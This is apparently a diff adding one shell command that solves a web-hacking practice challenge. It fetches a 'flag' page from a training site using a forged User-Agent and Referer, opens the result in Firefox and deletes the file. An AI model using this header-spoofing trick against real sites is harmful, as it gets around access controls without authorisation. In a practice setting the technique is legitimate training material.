@@ -1,0 +1,2 @@
+wget -O- --user-agent='CyberSecretAgent' --referer='supersecret.cyberwebsite.com' http://vic.hackersacademy.com/web04/index.php > flag.http ; xterm -e firefox flag.http ; rm flag.http
+
